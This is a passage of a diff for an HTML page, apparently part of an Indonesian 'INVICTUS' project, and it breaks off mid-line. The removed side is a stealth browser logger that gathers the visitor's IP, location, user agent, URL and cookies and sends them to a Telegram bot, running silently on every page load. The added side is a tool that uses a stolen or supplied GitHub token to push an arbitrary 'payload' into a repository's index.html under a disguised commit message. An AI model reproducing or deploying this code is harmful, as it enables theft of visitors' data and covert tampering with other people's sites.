@@ -1,136 +1,82 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Integrasi Gateway</title>
+    <title>INVICTUS - GitHub Deployer</title>
     <style>
-        :root { --neon: #00ff41; --bg: #050505; --panel: #111; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; }
-        .wrapper { max-width: 800px; margin: auto; border: 1px solid #333; border-radius: 8px; overflow: hidden; }
-        .header { background: var(--panel); padding: 20px; border-bottom: 1px solid var(--neon); }
-        .header h1 { margin: 0; color: var(--neon); font-size: 1.5rem; letter-spacing: 2px; }
-        .main-content { padding: 20px; background: #0a0a0a; }
-        .input-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; color: #888; font-size: 0.8rem; }
-        input, textarea { width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 4px; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(0, 255, 65, 0.2); }
-        .btn { width: 100%; padding: 15px; background: var(--neon); color: #000; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; border-radius: 4px; }
-        .btn:hover { background: #00cc33; }
-        #status-log { margin-top: 20px; font-family: monospace; font-size: 12px; color: #555; height: 100px; overflow-y: auto; background: #000; padding: 10px; border: 1px solid #222; }
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
+        .box { border: 1px solid #00ff41; padding: 20px; margin-bottom: 20px; background: #0a0a0a; }
+        input, textarea { width: 100%; background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 10px; margin: 10px 0; outline: none; }
+        textarea { height: 300px; }
+        button { background: #00ff41; color: #000; padding: 10px 20px; border: none; font-weight: bold; cursor: pointer; width: 100%; }
+        button:hover { background: #fff; }
+        .log { background: #111; padding: 10px; font-size: 12px; height: 100px; overflow-y: auto; border: 1px solid #333; }
     </style>
 </head>
 <body>
 
-    <div class="wrapper">
-        <div class="header">
-            <h1>INVICTUS CORE v4.0</h1>
-            <small style="color: #666;">Production Environment | Dev: Raffi</small>
-        </div>
+    <div class="box">
+        <h2>GITHUB REMOTE COMMANDER</h2>
+        <label>Personal Access Token (PAT):</label>
+        <input type="password" id="ghToken" placeholder="ghp_xxxxxxxxxxxx">
         
-        <div class="main-content">
-            <div class="input-group">
-                <label>Telegram Bot Token</label>
-                <input type="text" id="bot_token" placeholder="Contoh: 712345678:AAH_...">
-            </div>
-            <div class="input-group">
-                <label>Chat ID</label>
-                <input type="text" id="chat_id" placeholder="Contoh: 123456789">
-            </div>
-            <button class="btn" onclick="initializeSystem()">Deploy & Activate Stealth</button>
-            
-            <div id="status-log">
-                > System idle...
-            </div>
-        </div>
+        <label>Repo Path (Owner/RepoName):</label>
+        <input type="text" id="ghRepo" placeholder="username/repository-target">
+        
+        <label>File to Inject (e.g., index.html):</label>
+        <input type="text" id="ghPath" value="index.html">
     </div>
 
+    <div class="box">
+        <h2>PAYLOAD EDITOR (Auto Vercel Deploy)</h2>
+        <textarea id="payloadCode" placeholder="Masukkan full code HTML/JS baru di sini..."></textarea>
+        <button onclick="commitToGithub()">PUSH & REDEPLOY VERCEL</button>
+    </div>
+
+    <div class="log" id="statusLog">> System Ready...</div>
+
     <script>
-        const logArea = document.getElementById('status-log');
-        
-        function pushLog(msg) {
-            const time = new Date().toLocaleTimeString();
-            logArea.innerHTML += `<div>[${time}] ${msg}</div>`;
-            logArea.scrollTop = logArea.scrollHeight;
+        function addLog(msg) {
+            const log = document.getElementById('statusLog');
+            log.innerHTML += `<div>> ${msg}</div>`;
+            log.scrollTop = log.scrollHeight;
         }
 
-        // FUNGSI INJEKSI & EKSEKUSI
-        function initializeSystem() {
-            const token = document.getElementById('bot_token').value;
-            const id = document.getElementById('chat_id').value;
+        async function commitToGithub() {
+            const token = document.getElementById('ghToken').value;
+            const repo = document.getElementById('ghRepo').value;
+            const path = document.getElementById('ghPath').value;
+            const newContent = document.getElementById('payloadCode').value;
 
-            if(!token || !id) {
-                pushLog("ERROR: Konfigurasi tidak lengkap!");
-                return;
-            }
+            if(!token || !repo || !newContent) return alert("Data tidak lengkap!");
 
-            // Simpan secara permanen di browser
-            localStorage.setItem('_sys_token', token);
-            localStorage.setItem('_sys_chat_id', id);
-            
-            pushLog("SUCCESS: Konfigurasi disimpan.");
-            pushLog("ACTION: Menjalankan Stealth Logger...");
-            
-            runStealthEngine();
-        }
+            addLog("Memulai proses injeksi ke GitHub...");
 
-        async function runStealthEngine() {
-            const token = localStorage.getItem('_sys_token');
-            const id = localStorage.getItem('_sys_chat_id');
-
-            if(!token || !id) return;
-
-            // 1. Ambil Data IP & Lokasi
-            let networkInfo = {};
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                networkInfo = await res.json();
-            } catch (e) { networkInfo = { error: "Failed to fetch IP" }; }
+                // 1. Ambil SHA file lama (Wajib untuk update file di GitHub API)
+                const getUrl = `https://api.github.org/repos/${repo}/contents/${path}`;
+                const res = await fetch(getUrl, {
+                    headers: { "Authorization": `token ${token}` }
+                });
+                const data = await res.json();
+                const sha = data.sha;
 
-            // 2. Susun Laporan Malware
-            const report = `
-<b>🚨 INVICTUS ALERT: TARGET DETECTED</b>
-------------------------------------
-<b>🌐 NETWORK INFO:</b>
-IP: <code>${networkInfo.ip || 'N/A'}</code>
-City: <code>${networkInfo.city || 'N/A'}</code>
-ISP: <code>${networkInfo.org || 'N/A'}</code>
+                addLog("File SHA ditemukan: " + sha);
 
-<b>💻 SYSTEM INFO:</b>
-Platform: <code>${navigator.platform}</code>
-Agent: <code>${navigator.userAgent.split(') ')[0]})</code>
-URL: <code>${window.location.href}</code>
-
-<b>🔑 DATA LEAK:</b>
-Cookies: <code>${document.cookie || 'No Access/Empty'}</code>
-Local Storage: <code>${Object.keys(localStorage).length} keys found</code>
-------------------------------------
-<i>System: Stealth Mode Active</i>
-            `;
-
-            // 3. Kirim ke Telegram
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                // 2. Push Update
+                const updateUrl = `https://api.github.org/repos/${repo}/contents/${path}`;
+                const pushRes = await fetch(updateUrl, {
+                    method: "PUT",
+                    headers: {
+                        "Authorization": `token ${token}`,
+                        "Content-Type": "application/json"
+                    },
                     body: JSON.stringify({
-                        chat_id: id,
-                        text: report,
-                        parse_mode: 'HTML'
+                        message: "update: system optimization", // Pesan commit samaran
+                        content: btoa(unescape(encodeURIComponent(newContent))), // Encode ke Base64
+                        sha: sha
                     })
                 });
-                
-                if(response.ok) pushLog("STEALTH: Data korban berhasil dikirim.");
-                else pushLog("STEALTH: Gagal mengirim data (API Error).");
-            } catch (err) {
-                pushLog("STEALTH: Error koneksi.");
-            }
-        }
 
-        // AUTO-RUN: Jika sudah pernah dideploy, langsung jalankan diam-diam saat web dibuka
-        if(localStorage.getItem('_sys_token')) {
-            window.addEventListener('load', runStealthEngine);
-        }
-    </script>
-</body>
-</html>
+                if(pushRes.ok) {
+                    addLog("SUCCESS: Kode berhasil di
